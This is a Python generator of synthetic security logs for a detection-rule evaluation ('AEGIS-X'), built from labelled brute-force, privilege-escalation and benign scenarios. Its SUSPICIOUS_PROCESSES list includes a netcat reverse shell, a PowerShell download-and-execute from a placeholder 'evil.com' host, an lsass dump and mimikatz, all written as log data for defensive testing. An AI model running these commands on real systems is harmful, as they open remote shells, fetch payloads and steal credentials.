"""
Synthetic security event generator for AEGIS-X.

Generates realistic but synthetic security logs for testing and evaluation.
Produces both malicious and benign scenarios with configurable random seeds
for reproducibility.

IMPORTANT: Two separate datasets must be maintained:
- Development dataset (seed=42): Used during development and rule tuning.
- Evaluation dataset (seed=7777): Reserved for evaluation only.
  Must NOT be used for tuning. Must NOT be overwritten by dev regeneration.

Each scenario is tagged with metadata so the evaluation framework can
compute TP/FP/FN/TN at the scenario level.
"""

import json
import os
import random
from datetime import datetime, timedelta, timezone
from typing import Any


# --- Scenario metadata ---
# Each generated scenario carries this info for evaluation.

class ScenarioMeta:
    """Metadata about a generated scenario."""

    def __init__(
        self,
        scenario_id: str,
        name: str,
        is_malicious: bool,
        expected_rules: list[str],
        description: str,
    ):
        self.scenario_id = scenario_id
        self.name = name
        self.is_malicious = is_malicious
        self.expected_rules = expected_rules  # Which rules SHOULD fire
        self.description = description

    def to_dict(self) -> dict:
        return {
            "scenario_id": self.scenario_id,
            "name": self.name,
            "is_malicious": self.is_malicious,
            "expected_rules": self.expected_rules,
            "description": self.description,
        }


# --- Synthetic data generators ---

USERS = ["alice", "bob", "charlie", "admin", "svc_backup", "developer1",
         "analyst_jones", "operator_lee"]
DEVICES = ["WS-001", "WS-002", "WS-003", "SRV-DC01", "SRV-APP01",
           "LAPTOP-DEV", "WS-SEC01", "SRV-DB01"]
IPS = ["192.168.1.10", "192.168.1.11", "192.168.1.50", "10.0.0.5",
       "10.0.0.100", "172.16.0.20", "192.168.1.200", "10.0.0.55"]

BENIGN_PROCESSES = [
    "outlook.exe", "chrome.exe", "explorer.exe", "notepad.exe",
    "code.exe", "python.exe", "svchost.exe", "teams.exe",
    "powershell.exe -Command Get-Process",
    "powershell.exe -Command Get-Service",
    "cmd.exe /c dir",
]

SUSPICIOUS_PROCESSES = [
    "mimikatz.exe",
    "psexec.exe \\\\SRV-DC01 cmd",
    "procdump.exe -ma lsass.exe",
    "nc.exe -e cmd.exe 10.0.0.99 4444",
    "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "powershell.exe -encodedcommand ZG93bmxvYWRzdHJpbmc=",
    "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
]


def _make_base_time(rng: random.Random, work_hours: bool = True) -> datetime:
    """Generate a base timestamp.

    Args:
        rng: Random instance for reproducibility.
        work_hours: If True, generate within 08:00-18:00. If False, generate off-hours.
    """
    # Base date: a weekday in a recent week
    base_date = datetime(2024, 11, 18, tzinfo=timezone.utc)  # Monday
    day_offset = rng.randint(0, 4)  # Mon-Fri
    base_date += timedelta(days=day_offset)

    if work_hours:
        hour = rng.randint(8, 17)
    else:
        # Off-hours: 0-6 or 21-23
        hour = rng.choice([rng.randint(0, 6), rng.randint(21, 23)])

    minute = rng.randint(0, 59)
    second = rng.randint(0, 59)

    return base_date.replace(hour=hour, minute=minute, second=second)


def _gen_event(
    timestamp: datetime,
    user: str,
    device: str,
    ip: str,
    event_type: str,
    source: str,
    process: str | None = None,
) -> dict[str, Any]:
    """Generate a single raw event dict (before ingestion)."""
    event: dict[str, Any] = {
        "timestamp": timestamp.isoformat(),
        "user": user,
        "device": device,
        "ip": ip,
        "event_type": event_type,
        "source": source,
    }
    if process:
        event["process"] = process
    return event


# =============================================================================
# MALICIOUS SCENARIOS
# =============================================================================

def scenario_brute_force(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Scenario: Brute-force login — 7 failed logins in 5 minutes."""
    user = rng.choice(USERS[:4])
    device = rng.choice(DEVICES[:4])
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    for i in range(7):
        t = base_time + timedelta(seconds=rng.randint(20, 50) * i)
        events.append(_gen_event(t, user, device, ip, "login_failure", "authentication"))

    meta = ScenarioMeta(
        scenario_id="MAL_BF_001",
        name="Brute-Force Login Attack",
        is_malicious=True,
        expected_rules=["brute_force_login"],
        description=f"7 failed login attempts for user '{user}' within ~5 minutes.",
    )
    return events, meta


def scenario_brute_force_then_success(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Scenario: Brute-force followed by successful login."""
    user = rng.choice(USERS[:4])
    device = rng.choice(DEVICES[:4])
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    # 6 failures
    for i in range(6):
        t = base_time + timedelta(seconds=rng.randint(15, 40) * i)
        events.append(_gen_event(t, user, device, ip, "login_failure", "authentication"))

    # Then success
    t = base_time + timedelta(minutes=4)
    events.append(_gen_event(t, user, device, ip, "login_success", "authentication"))

    meta = ScenarioMeta(
        scenario_id="MAL_BFS_001",
        name="Brute-Force with Successful Login",
        is_malicious=True,
        expected_rules=["brute_force_login"],
        description=f"6 failed logins followed by success for user '{user}'.",
    )
    return events, meta


def scenario_privilege_escalation(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Scenario: Privilege escalation event."""
    user = rng.choice(USERS[:4])
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    # Normal login first
    events.append(_gen_event(base_time, user, device, ip, "login_success", "authentication"))

    # Then privilege escalation
    esc_type = rng.choice(["privilege_escalation", "admin_privileges_granted", "sudo_elevation"])
    t = base_time + timedelta(minutes=rng.randint(2, 10))
    events.append(_gen_event(t, user, device, ip, esc_type, "endpoint"))

    meta = ScenarioMeta(
        scenario_id="MAL_PE_001",
        name="Privilege Escalation",
        is_malicious=True,
        expected_rules=["privilege_escalation"],
        description=f"User '{user}' escalated privileges ({esc_type}).",
    )
    return events, meta


def scenario_suspicious_process(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Scenario: Suspicious process execution."""
    user = rng.choice(USERS[:4])
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    process = rng.choice(SUSPICIOUS_PROCESSES)
    events = []

    events.append(_gen_event(base_time, user, device, ip, "login_success", "authentication"))
    t = base_time + timedelta(minutes=rng.randint(5, 15))
    events.append(_gen_event(t, user, device, ip, "process_start", "endpoint", process=process))

    meta = ScenarioMeta(
        scenario_id="MAL_SP_001",
        name="Suspicious Process Execution",
        is_malicious=True,
        expected_rules=["suspicious_process"],
        description=f"Suspicious process '{process.split()[0]}' executed by '{user}'.",
    )
    return events, meta


def scenario_multi_stage_attack(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Scenario: Coordinated multi-stage attack chain.

    Brute force → successful login → privilege escalation → suspicious process.
    This should trigger CRITICAL severity.
    """
    user = rng.choice(USERS[:3])
    device = rng.choice(DEVICES[:3])
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    # Phase 1: Brute force (5 failures)
    for i in range(5):
        t = base_time + timedelta(seconds=rng.randint(20, 45) * i)
        events.append(_gen_event(t, user, device, ip, "login_failure", "authentication"))

    # Phase 2: Successful login
    t = base_time + timedelta(minutes=5)
    events.append(_gen_event(t, user, device, ip, "login_success", "authentication"))

    # Phase 3: Privilege escalation
    t = base_time + timedelta(minutes=8)
    events.append(_gen_event(t, user, device, ip, "privilege_escalation", "endpoint"))

    # Phase 4: Suspicious process
    process = rng.choice(SUSPICIOUS_PROCESSES[:3])
    t = base_time + timedelta(minutes=12)
    events.append(_gen_event(t, user, device, ip, "process_start", "endpoint", process=process))

    meta = ScenarioMeta(
        scenario_id="MAL_MSA_001",
        name="Multi-Stage Attack Chain",
        is_malicious=True,
        expected_rules=["brute_force_login", "privilege_escalation", "suspicious_process"],
        description=(
            f"Coordinated attack: brute-force → login → privilege escalation "
            f"→ suspicious process by '{user}'."
        ),
    )
    return events, meta


# =============================================================================
# BENIGN SCENARIOS
# =============================================================================

def scenario_benign_few_failures(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Benign: 2 mistyped passwords followed by successful login."""
    user = rng.choice(USERS)
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    # 2 failures (below threshold)
    for i in range(2):
        t = base_time + timedelta(seconds=rng.randint(5, 20) * i)
        events.append(_gen_event(t, user, device, ip, "login_failure", "authentication"))

    # Then success
    t = base_time + timedelta(seconds=60)
    events.append(_gen_event(t, user, device, ip, "login_success", "authentication"))

    meta = ScenarioMeta(
        scenario_id="BEN_FP_001",
        name="Benign Password Mistype",
        is_malicious=False,
        expected_rules=[],
        description=f"User '{user}' mistyped password twice, then succeeded. Normal behavior.",
    )
    return events, meta


def scenario_benign_authorized_night_login(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Benign: Authorized admin logging in at 02:00.

    This user should have an authorized schedule that covers night hours.
    The unusual_login_time rule should NOT fire for this user.
    """
    user = "admin"
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    # Set time to 02:00 on a weekday
    base_date = datetime(2024, 11, 19, 2, 0, 0, tzinfo=timezone.utc)  # Tuesday 02:00
    events = []

    events.append(_gen_event(base_date, user, device, ip, "login_success", "authentication"))

    meta = ScenarioMeta(
        scenario_id="BEN_NL_001",
        name="Authorized Night Login",
        is_malicious=False,
        expected_rules=[],
        description=f"Admin '{user}' logged in at 02:00 — has authorized night schedule.",
    )
    return events, meta


def scenario_benign_powershell(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Benign: Normal PowerShell usage (no suspicious arguments)."""
    user = rng.choice(USERS)
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    events.append(_gen_event(
        base_time, user, device, ip, "process_start", "endpoint",
        process="powershell.exe -Command Get-Process"
    ))
    t = base_time + timedelta(minutes=5)
    events.append(_gen_event(
        t, user, device, ip, "process_start", "endpoint",
        process="powershell.exe -Command Get-Service"
    ))

    meta = ScenarioMeta(
        scenario_id="BEN_PS_001",
        name="Legitimate PowerShell Usage",
        is_malicious=False,
        expected_rules=[],
        description=f"User '{user}' ran normal PowerShell commands. Not malicious.",
    )
    return events, meta


def scenario_benign_single_failure(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Benign: Single failed login followed by success."""
    user = rng.choice(USERS)
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng)
    events = []

    events.append(_gen_event(base_time, user, device, ip, "login_failure", "authentication"))
    t = base_time + timedelta(seconds=30)
    events.append(_gen_event(t, user, device, ip, "login_success", "authentication"))

    meta = ScenarioMeta(
        scenario_id="BEN_SF_001",
        name="Single Failed Login",
        is_malicious=False,
        expected_rules=[],
        description=f"User '{user}' had one failed login, then succeeded. Normal.",
    )
    return events, meta


def scenario_benign_normal_activity(rng: random.Random) -> tuple[list[dict], ScenarioMeta]:
    """Benign: Ordinary user workday activity."""
    user = rng.choice(USERS[4:])  # Non-admin users
    device = rng.choice(DEVICES)
    ip = rng.choice(IPS)
    base_time = _make_base_time(rng, work_hours=True)
    events = []

    # Login
    events.append(_gen_event(base_time, user, device, ip, "login_success", "authentication"))

    # Normal file access
    for i in range(3):
        t = base_time + timedelta(minutes=rng.randint(10, 60) * (i + 1))
        events.append(_gen_event(t, user, device, ip, "file_access", "endpoint",
                                 process=rng.choice(BENIGN_PROCESSES[:5])))

    # Logout
    t = base_time + timedelta(hours=rng.randint(6, 9))
    events.append(_gen_event(t, user, device, ip, "logout", "authentication"))

    meta = ScenarioMeta(
        scenario_id="BEN_NA_001",
        name="Normal User Activity",
        is_malicious=False,
        expected_rules=[],
        description=f"User '{user}' normal workday: login, file access, logout.",
    )
    return events, meta


# =============================================================================
# GENERATOR
# =============================================================================

def generate_dataset(
    seed: int,
    output_dir: str,
    dataset_name: str = "dataset",
) -> dict[str, Any]:
    """Generate a complete synthetic dataset with malicious and benign scenarios.

    Args:
        seed: Random seed for reproducibility.
        output_dir: Directory to write the output files.
        dataset_name: Name label for this dataset.

    Returns:
        Summary dict with file paths and scenario metadata.

    Output files:
        - auth_events.csv: Authentication log events.
        - endpoint_events.csv: Endpoint log events.
        - auth_events.json: Same data in JSON format.
        - endpoint_events.json: Same data in JSON format.
        - scenarios.json: Metadata about each scenario (for evaluation).
    """
    rng = random.Random(seed)

    # Generate all scenarios
    malicious_generators = [
        scenario_brute_force,
        scenario_brute_force_then_success,
        scenario_privilege_escalation,
        scenario_suspicious_process,
        scenario_multi_stage_attack,
    ]

    benign_generators = [
        scenario_benign_few_failures,
        scenario_benign_authorized_night_login,
        scenario_benign_powershell,
        scenario_benign_single_failure,
        scenario_benign_normal_activity,
    ]

    all_events: list[dict] = []
    all_metas: list[ScenarioMeta] = []
    scenario_counter = 0

    for gen_func in malicious_generators:
        events, meta = gen_func(rng)
        # Give each scenario a unique ID for this dataset
        scenario_counter += 1
        meta.scenario_id = f"S{scenario_counter:03d}_{meta.scenario_id}"
        # Tag events with scenario ID
        for evt in events:
            evt["_scenario_id"] = meta.scenario_id
        all_events.extend(events)
        all_metas.append(meta)

    for gen_func in benign_generators:
        events, meta = gen_func(rng)
        scenario_counter += 1
        meta.scenario_id = f"S{scenario_counter:03d}_{meta.scenario_id}"
        for evt in events:
            evt["_scenario_id"] = meta.scenario_id
        all_events.extend(events)
        all_metas.append(meta)

    # Sort all events by timestamp for realistic log ordering
    all_events.sort(key=lambda e: e["timestamp"])

    # Separate into auth and endpoint events
    auth_events = [e for e in all_events if e.get("source") == "authentication"]
    endpoint_events = [e for e in all_events if e.get("source") == "endpoint"]

    # Create output directory
    os.makedirs(output_dir, exist_ok=True)

    # Write CSV files
    _write_csv(auth_events, os.path.join(output_dir, "auth_events.csv"))
    _write_csv(endpoint_events, os.path.join(output_dir, "endpoint_events.csv"))

    # Write JSON files
    _write_json(auth_events, os.path.join(output_dir, "auth_events.json"))
    _write_json(endpoint_events, os.path.join(output_dir, "endpoint_events.json"))

    # Write scenario metadata
    scenarios_path = os.path.join(output_dir, "scenarios.json")
    with open(scenarios_path, "w", encoding="utf-8") as f:
        json.dump(
            {
                "dataset_name": dataset_name,
                "seed": seed,
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "total_events": len(all_events),
                "auth_events": len(auth_events),
                "endpoint_events": len(endpoint_events),
                "scenarios": [m.to_dict() for m in all_metas],
            },
            f,
            indent=2,
        )

    summary = {
        "dataset_name": dataset_name,
        "seed": seed,
        "output_dir": output_dir,
        "total_events": len(all_events),
        "auth_events": len(auth_events),
        "endpoint_events": len(endpoint_events),
        "malicious_scenarios": len(malicious_generators),
        "benign_scenarios": len(benign_generators),
        "files": {
            "auth_csv": os.path.join(output_dir, "auth_events.csv"),
            "endpoint_csv": os.path.join(output_dir, "endpoint_events.csv"),
            "auth_json": os.path.join(output_dir, "auth_events.json"),
            "endpoint_json": os.path.join(output_dir, "endpoint_events.json"),
            "scenarios": scenarios_path,
        },
    }

    return summary


def _write_csv(events: list[dict], path: str) -> None:
    """Write events to a CSV file."""
    if not events:
        # Write empty file with headers
        with open(path, "w", encoding="utf-8") as f:
            f.write("timestamp,user,device,ip,event_type,source,process\n")
        return

    # Determine all columns (consistent order)
    columns = ["timestamp", "user", "device", "ip", "event_type", "source", "process"]

    with open(path, "w", encoding="utf-8", newline="") as f:
        # Header
        f.write(",".join(columns) + "\n")
        # Rows
        for event in events:
            row = []
            for col in columns:
                val = event.get(col, "")
                if val is None:
                    val = ""
                val_str = str(val)
                # Quote fields containing commas or quotes
                if "," in val_str or '"' in val_str:
                    val_str = '"' + val_str.replace('"', '""') + '"'
                row.append(val_str)
            f.write(",".join(row) + "\n")


def _write_json(events: list[dict], path: str) -> None:
    """Write events to a JSON file."""
    # Remove internal metadata fields
    clean_events = []
    for event in events:
        clean = {k: v for k, v in event.items() if not k.startswith("_")}
        clean_events.append(clean)

    with open(path, "w", encoding="utf-8") as f:
        json.dump(clean_events, f, indent=2)


if __name__ == "__main__":
    # Quick standalone test
    print("Generating development dataset (seed=42)...")
    summary = generate_dataset(seed=42, output_dir="../../data/development", dataset_name="development")
    print(json.dumps(summary, indent=2))

    print("\nGenerating evaluation dataset (seed=7777)...")
    summary = generate_dataset(seed=7777, output_dir="../../data/evaluation", dataset_name="evaluation")
    print(json.dumps(summary, indent=2))
